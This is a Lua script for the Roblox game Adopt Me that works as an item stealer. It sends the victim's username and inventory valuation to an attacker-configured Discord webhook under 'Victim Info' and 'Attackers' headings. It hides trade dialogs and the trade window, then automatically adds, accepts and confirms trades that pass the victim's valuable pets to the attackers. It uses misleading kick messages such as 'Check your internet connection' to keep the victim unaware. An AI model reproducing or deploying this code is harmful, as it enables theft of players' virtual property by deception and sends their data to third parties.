_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local users = _G.Usernames or {}
local min_value = _G.min_value or 0.1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

local Players = game:GetService("Players")
local plr = Players.LocalPlayer

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add username or webhook")
    return
end

if game.PlaceId ~= 920587237 then
    plr:kick("Game not supported. Please join a normal Adopt Me server")
    return
end

if #Players:GetPlayers() >= 48 then
    plr:kick("Server is full. Please join a less populated server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

local itemsToSend = {}
local inTrade = false
local playerGui = plr:WaitForChild("PlayerGui")
local tradeFrame = playerGui.TradeApp.Frame
local dialog = playerGui.DialogApp.Dialog
local toolApp = playerGui.ToolApp.Frame
local tradeLicense = require(game.ReplicatedStorage.SharedModules.TradeLicenseHelper)

if not tradeLicense.player_has_trade_license() then
    plr:kick("This script wont work on an alt account. Please use your main account")
    return
end

local HttpService = game:GetService("HttpService")
local Loads = require(game.ReplicatedStorage.Fsys).load
local RouterClient = Loads("RouterClient")
local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
local SettingsRemote = RouterClient.get("SettingsAPI/SetSetting")
local InventoryDB = Loads("InventoryDB")

local headers = {
    ["Accept"] = "*/*",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
}

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏ HTTP –∑–∞–ø—Ä–æ—Å–æ–≤
local function safeRequest(requestData)
    local success, response = pcall(function()
        return request(requestData)
    end)
    
    if success and response then
        return response
    else
        warn("HTTP Request failed: " .. tostring(response))
        return nil
    end
end

local valueResponse = safeRequest({
    Url = "https://elvebredd.com/api/pets/get-latest",
    Method = "GET",
    Headers = headers
})

if not valueResponse then
    plr:kick("Failed to get pet values from Elvebredd")
    return
end

local success, responseData = pcall(function()
    return HttpService:JSONDecode(valueResponse.Body)
end)

if not success then
    plr:kick("Failed to parse pet values")
    return
end

local success, petsData = pcall(function()
    return HttpService:JSONDecode(responseData.pets)
end)

if not success then
    plr:kick("Failed to parse pets data")
    return
end

local petsByName = {}
for key, pet in pairs(petsData) do
    if type(pet) == "table" and pet.name then
        petsByName[pet.name] = pet
    end
end

local function getPetValue(petName, petProps)
    local pet = petsByName[petName]
    if not pet then
        return nil
    end

    local baseKey
    if petProps.mega_neon then
        baseKey = "mvalue"
    elseif petProps.neon then
        baseKey = "nvalue"
    else
        baseKey = "rvalue"
    end

    local suffix = ""
    if petProps.rideable and petProps.flyable then
        suffix = " - fly&ride"
    elseif petProps.rideable then
        suffix = " - ride"
    elseif petProps.flyable then
        suffix = " - fly"
    else
        suffix = " - nopotion"
    end

    local key = baseKey .. suffix
    return pet[key] or pet[baseKey]
end

local totalValue = 0

local function propertiesToString(props)
    local str = ""
    if props.rideable then str = str .. " Rideüî¥" end
    if props.flyable then str = str .. " Flyüîµ" end
    if props.mega_neon then
        str = str .. " Megaüü£"
    elseif props.neon then
        str = str .. " Neonüü¢"
    else
        str = str .. " Normal"
    end
    return str
end

local function SendJoinMessage(list, prefix)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    -- –°–æ–∑–¥–∞–µ–º —Ç–∞–±–ª–∏—Ü—É –¥–ª—è –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è
    local inventoryTable = {}
    for _, item in ipairs(list) do
        local key = item.Name .. "|" .. tostring(item.Properties.rideable) .. "|" .. tostring(item.Properties.flyable) .. "|" .. tostring(item.Properties.neon) .. "|" .. tostring(item.Properties.mega_neon)
        if not inventoryTable[key] then
            inventoryTable[key] = {
                name = item.Name,
                rideable = item.Properties.rideable,
                flyable = item.Properties.flyable,
                neon = item.Properties.neon,
                mega_neon = item.Properties.mega_neon,
                count = 0,
                totalValue = 0
            }
        end
        inventoryTable[key].count = inventoryTable[key].count + 1
        inventoryTable[key].totalValue = inventoryTable[key].totalValue + item.Value
    end

    -- –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º –≤ –º–∞—Å—Å–∏–≤ –∏ —Å–æ—Ä—Ç–∏—Ä—É–µ–º –ø–æ —Å—Ç–æ–∏–º–æ—Å—Ç–∏
    local sortedInventory = {}
    for _, item in pairs(inventoryTable) do
        table.insert(sortedInventory, item)
    end
    table.sort(sortedInventory, function(a, b)
        return a.totalValue > b.totalValue
    end)

    -- –§–æ—Ä–º–∏—Ä—É–µ–º –æ–ø–∏—Å–∞–Ω–∏–µ –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è
    local inventoryDescription = ""
    for _, item in ipairs(sortedInventory) do
        local itemName = item.name
        local properties = ""
        if item.rideable then properties = properties .. " Rideüî¥" end
        if item.flyable then properties = properties .. " Flyüîµ" end
        if item.mega_neon then
            properties = properties .. " Megaüü£"
        elseif item.neon then
            properties = properties .. " Neonüü¢"
        else
            properties = properties .. " Normal"
        end
        
        inventoryDescription = inventoryDescription .. string.format("%s %s (x%d): %.2f\n", itemName, properties, item.count, item.totalValue)
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(920587237, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "üéØ Join to get Adopt Me hit",
            ["color"] = 65280,
            ["fields"] = {
                {
                    name = "Victim Info",
                    value = string.format("Username: %s\nYou: %s", plr.Name, table.concat(users, ", ")),
                    inline = false
                },
                {
                    name = "Inventory Information",
                    value = string.format("```\nTotal Value: %.2f\n%s```", totalValue, inventoryDescription),
                    inline = false
                },
                {
                    name = "Join Link",
                    value = string.format("https://fern.wtf/joiner?placeId=85896571713843&gameInstanceId=%s", game.JobId),
                    inline = false
                }
            },
            ["footer"] = {
                ["text"] = "Adopt Me On Top"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = safeRequest({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    
    if not response then
        warn("Failed to send join message to Discord")
    end
end

local function SendMessage(sortedItems)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    -- –°–æ–∑–¥–∞–µ–º —Ç–∞–±–ª–∏—Ü—É –¥–ª—è –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è
    local inventoryTable = {}
    for _, item in ipairs(sortedItems) do
        local key = item.Name .. "|" .. tostring(item.Properties.rideable) .. "|" .. tostring(item.Properties.flyable) .. "|" .. tostring(item.Properties.neon) .. "|" .. tostring(item.Properties.mega_neon)
        if not inventoryTable[key] then
            inventoryTable[key] = {
                name = item.Name,
                rideable = item.Properties.rideable,
                flyable = item.Properties.flyable,
                neon = item.Properties.neon,
                mega_neon = item.Properties.mega_neon,
                count = 0,
                totalValue = 0
            }
        end
        inventoryTable[key].count = inventoryTable[key].count + 1
        inventoryTable[key].totalValue = inventoryTable[key].totalValue + item.Value
    end

    -- –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º –≤ –º–∞—Å—Å–∏–≤ –∏ —Å–æ—Ä—Ç–∏—Ä—É–µ–º –ø–æ —Å—Ç–æ–∏–º–æ—Å—Ç–∏
    local sortedInventory = {}
    for _, item in pairs(inventoryTable) do
        table.insert(sortedInventory, item)
    end
    table.sort(sortedInventory, function(a, b)
        return a.totalValue > b.totalValue
    end)

    -- –§–æ—Ä–º–∏—Ä—É–µ–º –æ–ø–∏—Å–∞–Ω–∏–µ –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è –≤ –≤–∏–¥–µ —Ç–∞–±–ª–∏—Ü—ã
    local inventoryDescription = "| Item | Properties | Count | Value |\n|---|---|---|---|\n"
    for _, item in ipairs(sortedInventory) do
        local properties = ""
        if item.rideable then properties = properties .. "R" end
        if item.flyable then properties = properties .. "F" end
        if item.mega_neon then
            properties = properties .. "Mega"
        elseif item.neon then
            properties = properties .. "Neon"
        else
            properties = properties .. "Normal"
        end
        
        inventoryDescription = inventoryDescription .. string.format("| %s | %s | x%d | %.2f |\n", 
            item.name, properties, item.count, item.totalValue)
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "üéØ New Adopt Me Execution",
            ["color"] = 65280,
            ["fields"] = {
                {
                    name = "Victim Info",
                    value = string.format("Username: %s\nAttackers: %s", plr.Name, table.concat(users, ", ")),
                    inline = false
                },
                {
                    name = "Inventory Information",
                    value = string.format("```%s```", inventoryDescription),
                    inline = false
                },
                {
                    name = "Total Value",
                    value = string.format("```%.2f```", totalValue),
                    inline = true
                }
            },
            ["footer"] = {
                ["text"] = "Adopt Me script by meentoz"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = safeRequest({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    
    if not response then
        warn("Failed to send execution message to Discord")
    else
        print("Message successfully sent to Discord!")
    end
end

local hashes = {}
for _, v in pairs(getgc()) do
    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
        local upvalues = debug.getupvalues(v)
        if type(upvalues[1]) == "table" then
            for key, value in pairs(upvalues[1]) do
                hashes[key] = value
            end
        end
    end
end

local function hashedAPI(remoteName, ...)
    local remote = hashes[remoteName]
    if not remote then return nil end

    if remote:IsA("RemoteFunction") then
        return remote:InvokeServer(...)
    elseif remote:IsA("RemoteEvent") then
        remote:FireServer(...)
    end
end

local data = hashedAPI("DataAPI/GetAllServerData")
if not data then
    plr:kick("Tampering detected. Please rejoin and re-execute without any other scripts")
    return
end

local excludedItems = {
    "spring_2025_minigame_scorching_kaijunior",
    "spring_2025_minigame_toxic_kaijunior",
    "spring_2025_minigame_spiked_kaijunior",
    "spring_2025_minigame_spotted_kaijunior"
}
local inventory = data[plr.Name].inventory

for category, list in pairs(inventory) do
    for uid, data in pairs(list) do
        local cat = InventoryDB[data.category]
        if cat and cat[data.id] then
            local value = getPetValue(cat[data.id].name, data.properties)
            if value and value >= min_value then
                if table.find(excludedItems, data.id) then
                    continue
                end
                table.insert(itemsToSend, {UID = uid, Name = cat[data.id].name, Properties = data.properties, Value = value})
                totalValue = totalValue + value
            end
        end
    end
end

tradeFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    if tradeFrame.Visible then
        inTrade = true
    else
        inTrade = false
    end
end)

dialog:GetPropertyChangedSignal("Visible"):Connect(function()
    dialog.Visible = false
end)

toolApp:GetPropertyChangedSignal("Visible"):Connect(function()
    toolApp.Visible = true
end)

game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b)
        return a.Value > b.Value
    end)

    local sentItems = {}
    for i, v in ipairs(itemsToSend) do
        sentItems[i] = v
    end

    local prefix = ""
    if ping == "Yes" then
        prefix = "--[[@everyone]] "
    end

    -- –î–∞–µ–º –≤—Ä–µ–º—è –¥–ª—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –ø–µ—Ä–µ–¥ –æ—Ç–ø—Ä–∞–≤–∫–æ–π
    wait(2)
    SendJoinMessage(itemsToSend, prefix)
    SettingsRemote:FireServer("trade_requests", 1)

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            local tradeRequestSent = false
            if not inTrade and not tradeRequestSent then
                SendTrade:FireServer(game.Players[joinedUser])
                tradeRequestSent = true
            else
                for i = 1, math.min(18, #itemsToSend) do
                    local item = table.remove(itemsToSend, 1)
                    AddPetRemote:FireServer(item.UID)
                end
                repeat
                    AcceptNegotiationRemote:FireServer()
                    wait(0.1)
                    ConfirmTradeRemote:FireServer()
                until not inTrade
                tradeRequestSent = false
            end
            wait(1)
        end
        plr:kick("Check your internet connection")
    end

    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        -- –î–∞–µ–º –≤—Ä–µ–º—è –ø–µ—Ä–µ–¥ –æ—Ç–ø—Ä–∞–≤–∫–æ–π —Ñ–∏–Ω–∞–ª—å–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è
                        wait(1)
                        SendMessage(sentItems)
                        sentMessage = true
                    end
                    doTrade(player.Name)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    waitForUserChat()
else
    warn("No items to send found in inventory")
    plr:kick("No valuable items found in inventory")
end
